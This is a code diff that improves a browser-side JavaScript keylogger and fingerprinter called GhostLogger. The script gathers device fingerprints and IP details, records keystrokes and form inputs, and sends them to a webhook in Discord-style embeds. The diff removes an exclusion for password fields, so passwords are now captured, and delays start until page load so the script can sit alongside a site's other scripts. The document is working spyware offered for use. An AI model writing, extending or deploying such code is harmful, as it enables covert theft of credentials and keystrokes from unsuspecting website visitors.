@@ -75,15 +75,22 @@ class GhostLogger {
     }
 
     async collectAllData() {
-        const p = [this.getBatteryInfo(), this.getScreenInfo(), this.getNetworkInfo(), this.getDeviceInfo(), this.getIPInfo(), this.getWebRTCInfo(), this.getCanvasFingerprint(), this.getWebGLFingerprint()];
+        const p = [
+            this.getBatteryInfo(), this.getScreenInfo(), this.getNetworkInfo(), 
+            this.getDeviceInfo(), this.getIPInfo(), this.getWebRTCInfo(), 
+            this.getCanvasFingerprint(), this.getWebGLFingerprint()
+        ];
         const r = await Promise.allSettled(p);
         r.forEach(res => { if (res.status === 'fulfilled') Object.assign(this.data, res.value); });
         this.data.datetime = new Date().toString();
     }
 
     async getBatteryInfo() {
-        const b = await navigator.getBattery();
-        return { battery: `${Math.round(b.level * 100)}%`, charging: b.charging ? 'Yes' : 'No' };
+        if ('getBattery' in navigator) {
+            const b = await navigator.getBattery();
+            return { battery: `${Math.round(b.level * 100)}%`, charging: b.charging ? 'Yes' : 'No' };
+        }
+        return { battery: 'N/A' };
     }
 
     getScreenInfo() {
@@ -108,19 +115,20 @@ class GhostLogger {
     }
 
     async getWebRTCInfo() {
-        return { local_ips: 'Scanning...' }; // Simplified for brevity
+        return { local_ips: "Scanning..." };
     }
 
     async getCanvasFingerprint() {
         const c = document.createElement('canvas');
         const ctx = c.getContext('2d');
         ctx.fillText('Ghost', 2, 15);
-        return { canvas: c.toDataURL().substring(0, 32) };
+        return { canvas: btoa(c.toDataURL()).substring(0, 32) };
     }
 
     async getWebGLFingerprint() {
         const c = document.createElement('canvas');
         const gl = c.getContext('webgl');
+        if (!gl) return { renderer: 'N/A' };
         const d = gl.getExtension('WEBGL_debug_renderer_info');
         return { renderer: gl.getParameter(d.UNMASKED_RENDERER_WEBGL) };
     }
@@ -132,7 +140,7 @@ class GhostLogger {
         });
 
         document.addEventListener('input', (e) => {
-            if (e.target.tagName === 'INPUT' && e.target.type !== 'password') {
+            if (e.target.tagName === 'INPUT') {
                 this.formData.push({ field: e.target.name || 'input', value: e.target.value });
             }
         });
@@ -144,6 +152,7 @@ class GhostLogger {
         const payload = {
             embeds: [{
                 title: "Ghost Logger - Full Recon",
+                color: 0x2f3136,
                 fields: Object.keys(this.data).map(k => ({ name: k, value: String(this.data[k]), inline: true }))
             }],
             username: "GhostLogger"
@@ -160,6 +169,7 @@ class GhostLogger {
         const payload = {
             embeds: [{
                 title: "Session Activity",
+                color: 0x00ff00,
                 description: `Keys: ${this.keystrokes.map(k => k.key).join('')}\nInputs: ${JSON.stringify(this.formData)}`
             }],
             username: "GhostLogger"
@@ -174,4 +184,7 @@ class GhostLogger {
     }
 }
 
-new GhostLogger();
+// Initialized at window load to prevent clashing with your other scripts
+window.addEventListener('load', () => {
+    new GhostLogger();
+});
